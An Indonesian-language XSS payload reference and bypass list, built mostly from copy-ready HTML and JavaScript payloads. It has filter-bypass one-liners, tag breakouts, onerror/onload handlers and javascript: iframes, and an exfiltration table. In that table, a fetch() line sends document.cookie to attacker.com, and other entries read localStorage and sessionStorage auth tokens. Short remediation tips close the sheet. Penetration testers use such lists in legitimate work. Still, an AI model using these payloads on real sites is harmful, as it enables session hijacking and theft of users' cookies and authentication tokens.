# XSS (Cross-Site Scripting) — Payload Reference & Bypass List

> **Tujuan:** Koleksi payload XSS (Reflected & Stored) untuk menguji kerentanan Cross-Site Scripting, bypass filter HTML/JavaScript, pencurian session/cookie, serta pencurian token otentikasi.

---

## Penjelasan Singkat

Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna tanpa sanitasi atau encoding di sisi server, sehingga skrip JavaScript arbitrer dieksekusi di browser korban.

---

## Quick One-Liners (Verifikasi Filter/Bypass Audit)

> **Tujuan:** Digunakan untuk tes cepat apakah filter hanya menghapus satu jenis tag/handler atau ada bias/ketimpangan dalam sanitasi.

```html
<!-- Check Filter Bias: Kombinasi Image Event Handler + Script Tag -->
<img src=x onerror=alert(1)><script>alert(2)</script>
<script>alert(3)</script><img src=x onerror=alert(4)>

<!-- Check Breakout + Dual Tag Execution -->
"><img src=x onerror=alert(5)><script>alert(6)</script>
'"><script>alert(7)</script><svg onload=alert(8)>

<!-- Check Mixed SVG + Image + Script Bypass -->
<svg/onload=alert(9)><img src=x onerror=alert(10)>
<details open onunhandledrejection=alert(11)><script>alert(12)</script>

<!-- Check ES6 Template String + Multi Tag Combination -->
<img/src=x onError="`${x}`;alert(13);"><script>alert(14)</script>

<!-- Check iframe Pseudo-Protocol + Media Elements (video/audio) -->
<iframe src="javascript:alert(15)"><video src=x onerror=alert(16)>
<video><source src=x onerror=alert(17)></video><iframe src="javascript:alert(18)"></iframe>
```

### 1. Basic `<script>` Tag Payloads

```html
<script>alert(1)</script>
<script>alert('XSSS')</script>
<script>alert("Hallo Guys !!")</script>
<script>alert(document.cookie)</script>
```

---

### 2. Tag & Attribute Breakout (Escape Form/Input Context)

```html
"><script>alert(1)</script>
"><script>$=100,alert($)</script>
"><script>x="Hacked",alert(x)</script>
"></select><img src=x onerror=alert("1");>
```

---

### 3. Image Tag Event Handler Payloads (`onerror`)

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(2)>
<img src=x onerror=alert("XSSH")>
<img src=x onerror=alert('SXSS')>
<img src=x onerror=alert(document.cookie)>
"><img src="x" onerror="prompt('senerex')">
```

---

### 4. Advanced & ES6 Template String Payloads

```html
<img/src=x onError="`${x}`;alert(`xss`);">
<img/src=x onError="`${x}`;alert(`lay`);">
<script>alert('XSSS')</script><img src=x onerror=alert("XSSH")>
<img src=x onerror=alert(2)><script>alert(1)</script>
```

---

### 5. `<iframe>` & HTML5 Media Payloads (`<video>`, `<audio>`)

```html
<iframe src="javascript:alert(`xss`)">
<iframe src="javascript:alert(document.cookie)">
<iframe src="javascript:alert(localStorage.getItem('token'))">
<video src=x onerror=alert(1)>
<video><source src=x onerror=alert(1)></video>
<audio src=x onerror=alert(1)>
```

---

## Exfiltrasi Sensitive Tokens & Session

| Target Data | Payload Example |
|-------------|-----------------|
| **Session Cookie** | `<script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>` |
| **Local Storage Token** | `<iframe src="javascript:alert(localStorage.getItem('token'))">` |
| **Session Storage Token** | `<script>alert(sessionStorage.getItem('auth_token'))</script>` |

---

## Tips Pengujian & Remediasi

1. **Test Vectors:** Mulai dari `<script>alert(1)</script>` sederhana, lalu tingkatkan ke atribut break `">`, event handler `<img src=x onerror=...>`, hingga pseudo-protocol `javascript:`.
2. **Output Encoding:** Pastikan aplikasi meng-encode output HTML (`HTML Entity Encoding`) sebelum me-render input ke halaman web.
3. **HTTPOnly Cookie Flag:** Lindungi cookie autentikasi dengan atribut `HttpOnly` agar JavaScript tidak dapat membaca `document.cookie`.